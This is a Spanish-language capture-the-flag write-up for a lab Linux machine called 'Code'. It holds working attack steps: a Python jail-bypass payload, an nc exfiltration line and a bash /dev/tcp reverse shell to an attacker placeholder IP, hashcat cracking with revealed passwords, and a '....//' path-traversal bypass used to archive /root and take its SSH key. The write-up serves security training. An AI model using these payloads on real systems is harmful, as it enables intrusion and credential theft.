# Write-Up - Code
 - - -- - - - - 
- Tags: #Linux #Easy 
- Skills Required: #Basic-Enumeration-Skills #Python-Scripting 
- Skills Learned: #Python-Jail-Bypass #Basic-Reversing
- - - - 
# Descripción:
Code es una máquina Linux sencilla con una aplicación web de edición de código Python, vulnerable a la ejecución remota de código al omitir la cárcel de Python. Tras obtener acceso como usuario appproduction, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se otorga acceso a otro usuario, martin, que tiene permisos de sudo para un script de utilidad de copia de seguridad, backy.sh. Este script incluye una sección de código vulnerable que, al ser explotada, permite escalar nuestros privilegios creando una copia de la carpeta raíz.
 -- - - - -
# Enumeración:
- - - - - 
Al realizar nuestro escaneo de Nmap para buscar puertos abiertos `nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn <IP>`, encontramos dos puertos abiertos:
- El 22 -> SSH
- El 5000 -> HTTP (gunicorn 20.0.4)
A continuación vamos a visitar el sitio web `http://code.htb`, previamente añadido al archivo /etc/hosts, al ver el sitio web nos encontramos son un editor de python online (sandbox), con funcionalidades como ejecutar código en Python y guardarlo en nuestra cuenta dentro del sitio web. Al ver esto se nos ocurre que quizás podríamos ejecutar código en la máquina host.
------
# Explotación:
- - - - 

Como se nos permite ejecutar código directamente, la función de guardar no es necesaria a no ser que quieras guardar tu trabajo. En primer lugar intentamos cargar módulos como `import`, `os`, `sys`, ya que estos nos permiten interactuar con el sistema, en este caso la máquina host. Al ejecutarlo nos aparece el siguiente mensaje "Use of restricted keywords is not allowed".
Ante esta situación lo próximo que pensamos en en alguna forma de bypassear el filtro, leyendo un artículo de [Medium Python Bypass](https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d), es aquí donde encontramos una forma de usar los módulos necesarios para ejecutar comandos.
```python
[w for w in 1..__class__.__base__.__subclasses__() if w.__name__=='Quitter']
[0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']
('whoami')
```
Este código bypasea la restricted keywords utilizando los objetos y subclases de Python para localizar la clase 'Quitter'. Esto nos permite acceder a '`__globals__`' desde el método '`__init__`', que nos permite el acceso a '`sys.modules`' desde donde se recupera '`os.system`'.
Todo esto nos permite ejecutar comandos de shell en la máquina víctima sin necesidad de usar la restricted keywords, ya que se usa la concatenación de cadenas de texto como ('o' + 's').

Al ejecutar el código no recibimos ningún output, lo que sugiere que el código se está ejecutando en el host y este no llega a volver al frontend. Para comprobar si esto es realmente lo que sucede, vamos a redirigir el output del comando ejecutado a nuestra máquina atacante, en la que debemos estar a la escucha.
En la máquina atacante: `nc -nlvp 4444`

Ahora debemos modificar el código para redirigirlo a nuestro equipo:
```python
[w for w in 1..__class__.__base__.__subclasses__() if w.__name__=='Quitter']
[0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('whoami
| nc {YOURIPADDRESS} 4444')
```
Al ejecutarlo vemos que la respuesta nos llega a nuestro equipo y vemos que el usuario encargado de ejecutarlo es 'app-production'.

Una vez que hemos comprobado que tenemos capacidad de ejecución de comandos en la máquina víctima podemos entablar una reverse shell a nuestra máquina de atacante:
```python
[w for w in 1..__class__.__base__.__subclasses__() if w.__name__=='Quitter']
[0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('bash -
c "bash -i >& /dev/tcp/{YOURIPADDRESS}/4444 0>&1"')
```
Con esto nos encontramos dentro del sistema como el usuario 'app-production', encontraremos la flag en su directorio de trabajo (/home/app-production).
- - - - - -
# Movimiento Lateral:
 - - - - -

Con el acceso al sistema, lo que debemos hacer es enumerar los directorios y archivos a los que tengamos acceso, dentro del directorio `/app/instance` vemos una base de datos que puede ser abierta con `sqlite3` o transferida a nuestra máquina. Si la abrimos con `sqlite3 database.db`, listamos las tablas con `.tables`, nos metemos dentro de user con `selct * from user;`, aquí vemos dos nombres de usuario con su respectivo hash.
Copiamos los hashes en un archivo hash.txt en nuestra máquina atacante, para crackearlos con hashcat `hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt`. Una vez finalizado el ataque vemos que para el usuario **development** su password es **development** y para **martin** es **nafeelswordsmaster**.

Como 'app-production' leemos el archivo '/etc/passwd' y observamos que martin es un usuario del sistema. Ahora migramos al usuario 'martin' con `ssh martin@code.htb` y proporcionamos su password.
- -- - - 
# Elevación de Privilegios:
- - - - -

En primer lugar listamos los privilegios a nivel de sudoers y vemos que martin puede ejecutar un script en bash '/usr/bin/backy.sh' sin proporcionar contraseña, al hacer `sudo /usr/bin/backy.sh` vemos que es necesario un archivo task.json.
En la carpeta backups dentro del directorio de martin encontramos un archivo task.json, revisando su contenido vemos que podemos especificar el directorio a archivar y donde se ubicará.
Revisaremos el script backy.sh para buscar algún código vulnerable o entender como crea los archivos.

El script tiene dos capas de filtrado para limitar los directorios que se pueden archivar. El filtro 'allowed_paths' permite rutas que comiencen por '/var' o '/home', es llamado por la función 'is_allowed_paths'.
El segundo filtro sanitiza la entrada JSON eliminando '../' (ir directorios hacia atrás), pero lo elimina la instancia de forma literal no recursiva, por lo tanto si utilizamos '....//' nos permite omitir esta comprobación, ya que elimina la primera instancia, pero no las restantes.
Podemos indicar el directorio '/home' y usando '....//' nos ubicamos dentro de '/root' de tal forma que archivaremos todo el contenido del directorio. Para ello modificamos el archivo 'task.json':
```json
{
	"destination": "/tmp",
	"multiprocessing": true,
	"verbose_log": true,
	"directories_to_archive": [
		"/home/....//root/"
	]
}
```
Esto le indica a backy.sh que archive '/root' y lo deposite en /tmp.
Ahora nos movemos a '/tmp' con `cd /tmp` y al listar el contenido con `ls -l` vemos el archivo '`code_home_.._root_2025_June.tar.bz2`'.

Al descomprimirlo tendremos acceso a todo los directorios y archivos del directorio '/root' `tar -xvf code_home_.._root_2025_June.tar.bz2`.
Ya tenemos acceso a la flag pero si queremos terminar la escalada podemos utilizar la id_rsa de root, leemos el archivo `cat .ssh/id_rsa` y lo copiamos a un archivo llamado root.key en nuestra máquina de atacante, le damos permisos con `chmod 600 root.key` y finalmente nos registramos por ssh con `ssh -i root.key root@code.htb`.
Hemos logrado total acceso al sistema y encontramos la flag en '/root/root.txt'
